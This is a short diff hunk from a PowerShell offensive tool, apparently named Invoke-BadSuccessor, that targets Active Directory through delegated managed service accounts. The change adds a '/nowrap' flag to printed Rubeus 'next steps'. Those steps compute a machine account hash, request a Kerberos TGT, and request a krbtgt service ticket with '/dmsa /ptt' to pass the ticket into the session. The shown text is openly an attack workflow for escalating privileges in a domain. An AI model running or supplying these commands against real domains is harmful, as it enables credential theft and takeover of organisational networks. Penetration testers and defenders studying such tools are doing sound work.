@@ -690,7 +690,7 @@ function Invoke-BadSuccessor {
         Write-Host ""
         Write-Host "[+] Next steps (Rubeus):" -ForegroundColor Cyan
         Write-Host "    Rubeus.exe hash /password:'$Password' /user:$($machine.SamAccountName) /domain:$domain"
-        Write-Host "    Rubeus.exe asktgt /user:$($machine.SamAccountName) /aes256:<AES256KEY> /domain:$domain"
+        Write-Host "    Rubeus.exe asktgt /user:$($machine.SamAccountName) /aes256:<AES256KEY> /domain:$domain /nowrap"
         Write-Host "    Rubeus.exe asktgs /targetuser:$($service.SamAccountName) /service:krbtgt/$domain /dmsa /opsec /ptt /nowrap /outfile:ticket.kirbi /ticket:<BASE64TGT>"
     }
 }
